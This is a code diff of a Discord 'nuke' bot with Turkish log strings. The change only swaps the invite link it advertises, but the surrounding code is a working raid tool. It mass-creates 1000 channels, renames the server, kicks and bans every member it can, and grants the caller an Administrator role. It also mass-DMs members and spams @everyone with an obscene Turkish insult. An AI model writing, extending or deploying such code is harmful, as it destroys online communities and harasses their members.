@@ -13,7 +13,7 @@ client.login(config.token);
 // Event handler
 client.once('ready', () => {
   console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);
-  client.user.setActivity('discord.gg/excode', { type: 'PLAYING' });
+  client.user.setActivity('discord.gg/bdfd', { type: 'PLAYING' });
 });
 
 // Event handler for message creation
@@ -26,7 +26,7 @@ client.on('messageCreate', async (msg) => {
       const channelsToCreate = [];
       let i = 0;
       while (i < 1000) {
-        channelsToCreate.push({ name: 'discord.gg/excode', type: ChannelType.GuildText });
+        channelsToCreate.push({ name: 'discord.gg/bdfd', type: ChannelType.GuildText });
         i++;
       }
 
@@ -55,7 +55,7 @@ client.on('messageCreate', async (msg) => {
       // Update guild settings
       try {
         await msg.guild.setIcon('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await msg.guild.setName('discord.gg/excode');
+        await msg.guild.setName('discord.gg/bdfd');
       } catch (err) {
         console.error('Failed to update guild settings:', err);
       }
@@ -74,7 +74,7 @@ client.on('messageCreate', async (msg) => {
       // Update bot settings
       try {
         await client.user.setAvatar('https://pbs.twimg.com/media/Ex6m_hqXIAQLWeZ?format=jpg&name=4096x4096');
-        await client.user.setUsername('discord.gg/excode UWU');
+        await client.user.setUsername('discord.gg/bdfd UWU');
       } catch (err) {
         console.error('Failed to update bot settings:', err);
       }
@@ -89,14 +89,14 @@ client.on('messageCreate', async (msg) => {
   await Promise.all(
     msg.guild.members.cache.map(member => {
       if (member.kickable && member.id !== client.user.id) {
-        return member.kick('discord.gg/excode').then(() => console.log(`${member.user.tag} atıldı.`)).catch(err => console.error(`Kick hatası: ${err}`));
+        return member.kick('discord.gg/bdfd').then(() => console.log(`${member.user.tag} atıldı.`)).catch(err => console.error(`Kick hatası: ${err}`));
       }
     })
   );
 },
 '+dm': async () => {
   await msg.delete();
-  const message = ' **SWENZY BABA SIKERR https://discord.gg/excode ** ';
+  const message = ' **SWENZY BABA SIKERR https://discord.gg/bdfd ** ';
   
   await Promise.all(
     msg.guild.members.cache.map(member => {
@@ -108,7 +108,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+yetki': async () => {
       await msg.delete();
-      const role = await msg.guild.roles.create({ name: '</>', permissions: [PermissionFlagsBits.Administrator] });
+      const role = await msg.guild.roles.create({ name: 'bdfd', permissions: [PermissionFlagsBits.Administrator] });
       await msg.member.roles.add(role);
     },
 '+ban': async () => {
@@ -116,7 +116,7 @@ client.on('messageCreate', async (msg) => {
   await Promise.all(
     msg.guild.members.cache.map(member => {
       if (member.bannable && member.id !== client.user.id) {
-        return member.ban({ reason: 'discord.gg/excode' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
+        return member.ban({ reason: 'discord.gg/bdfd' }).then(() => console.log(`${member.user.tag} banlandı.`)).catch(err => console.error(`Ban hatası: ${err}`));
       }
     })
   );
@@ -138,7 +138,7 @@ client.on('messageCreate', async (msg) => {
 },
     '+spam': async () => {
       await msg.delete();
-      const spamMessage = '**SWENZY BABA SIKERR @everyone https://discord.gg/excode**';
+      const spamMessage = '**SWENZY BABA SIKERR @everyone https://discord.gg/bdfd**';
       for (let i = 0; i < 100; i++) {
         await msg.channel.send(spamMessage);
       }
@@ -162,7 +162,7 @@ client.on('messageCreate', async (msg) => {
             url: 'https://cdn.discordapp.com/attachments/1173319481599213639/1258825072248881292/a_0b05ce4dbc49d501b989eb54b99aa805.gif?ex=668973b5&is=66882235&hm=39b19bd6622752e65ebbc3d26c855c5933a862970d56b807131a8592cd6f5922&',
           },
         color: 0xff0000,
-        footer: { text: 'discord.gg/excode' }
+        footer: { text: 'discord.gg/bdfd' }
       };
       await msg.channel.send({ embeds: [embed] });
     }
